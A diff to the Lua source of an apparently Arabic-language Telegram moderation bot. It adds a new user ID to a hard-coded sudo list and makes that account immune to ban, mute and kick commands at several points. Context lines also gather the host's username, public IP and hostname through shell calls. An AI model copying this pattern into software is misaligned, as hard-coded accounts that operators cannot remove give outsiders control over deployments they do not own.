@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1431678795,1422493638}
+List_Sudos = {Id_Sudo,1431678795,1422493638,415529019}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -206,6 +206,8 @@ function Get_Rank(user_id,chat_id)
 if tonumber(user_id) == tonumber(1431678795) then  
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1422493638) then  
+var = "مبرمج السورس"  
+elseif tonumber(user_id) == tonumber(415529019) then  
 var = "مبرمج السورس"  
 elseif DevRed_BuLL_Teame(user_id) == true then
 var = "المطور الاساسي"  
@@ -3255,6 +3257,10 @@ if result.id_ == tonumber(1422493638) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(415529019) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, "✬︙لا تسطيع حظر البوت عام")
 return false 
@@ -3279,6 +3285,10 @@ send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(1422493638) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(415529019) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -3319,6 +3329,10 @@ if result.id_ == tonumber(1422493638) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(415529019) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, "✬︙لا تستطيع كتم البوت عام")
 return false 
@@ -3343,6 +3357,10 @@ send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(1422493638) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(415529019) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -5650,6 +5668,10 @@ if result.id_ == tonumber(1422493638) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(415529019) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
 if result.id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
@@ -5728,6 +5750,10 @@ send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تق�
 return false 
 end
 if userid == tonumber(1422493638) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if userid == tonumber(415529019) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
@@ -5878,6 +5904,10 @@ return false
 end
 if result.sender_user_id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت  \n")
+return false 
+end
+if result.id_ == tonumber(415529019) then
+send(msg.chat_id_, msg.id_, "✬︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
 if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
